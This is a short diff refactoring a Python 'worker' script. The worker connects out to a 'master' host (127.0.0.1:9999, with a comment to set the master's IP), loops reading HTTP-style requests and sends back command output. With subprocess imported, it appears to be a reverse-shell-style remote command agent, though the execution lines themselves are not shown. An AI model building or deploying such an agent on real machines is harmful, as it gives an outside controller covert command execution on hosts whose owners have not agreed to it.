@@ -1,19 +1,18 @@
 import socket
 import subprocess
+from client_http import Client
 from request import Request
 from response import Response
 
-MASTER_HOST = "127.0.0.1"
-MASTER_PORT = 9999
-
-sock = socket.socket()
-sock.connect((MASTER_HOST, MASTER_PORT))
+# reuse Client.open() for connect — worker connects out like a client
+worker = Client()
+worker.open(("127.0.0.1", 9999))  # change to master's IP
 print("[+] Connected to master.")
 
 while True:
     raw = b""
     while True:
-        raw += sock.recv(4096)
+        raw += worker.connection.recv(4096)
         if b"\r\n\r\n" in raw:
             header_part, _, body_part = raw.partition(b"\r\n\r\n")
             content_length = None
@@ -36,6 +35,6 @@ while True:
         headers={"Content-Length": [str(len(output))]},
         body=output,
     )
-    sock.sendall(response.dump())
+    worker.connection.sendall(response.dump())
 
-sock.close()
+worker.connection.close()
